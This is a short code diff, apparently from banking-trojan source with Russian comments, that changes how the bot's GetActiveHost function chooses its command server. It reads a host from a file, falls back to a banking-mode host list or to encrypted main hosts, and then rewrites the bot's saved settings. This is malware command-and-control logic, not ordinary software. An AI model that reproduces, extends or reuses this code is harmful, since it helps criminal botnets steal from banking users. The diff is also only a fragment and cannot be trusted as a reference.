@@ -395,22 +395,28 @@ PCHAR GetActiveHost()
 string GetActiveHost(bool CheckBankingMode)
 {
 	// Функция возвращает активный (доступный) хост
+	bool FileExists = false;
+	string Host;
+
 	#ifndef DEBUGCONFIG
 		PCHAR H  = NULL;
 
 		// Первым этапом пытаемся получить хост из файла
-		if (Hosts::GetActiveHostFormFile(NULL, H))
+		if (Hosts::GetActiveHostFormFile(NULL, H, &FileExists))
 		{
-			CFGDBG("Cofig", "Получили хост из файла");
-			string Result(H);
+			Host = H;
 			STR::Free(H);
-			return Result;
+
+			if (!Host.IsEmpty())
+			{
+				CFGDBG("Cofig", "Получили хост из файла");
+				return Host;
+            }
 		}
 	#endif
 
 
 	// Проверяем режим банкинга
-	string Host;
 
 	#ifdef USE_BANKING_HOSTS
 		if (CheckBankingMode && IsBankingMode())
@@ -422,6 +428,13 @@ string GetActiveHost(bool CheckBankingMode)
 	#endif
 
 	Host = GetActiveHostFromBuf2(BOT_MAINHOSTS_ARRAY, BOTPARAM_HASH_MAINHOSTS, BOTPARAM_ENCRYPTED_MAINHOSTS);
+
+
+	if (!Host.IsEmpty() && FileExists)
+	{
+		// Перезаписываем настройки бота
+        BOT::SaveSettings(true, true, false);
+	}
 
 	return Host;
 }
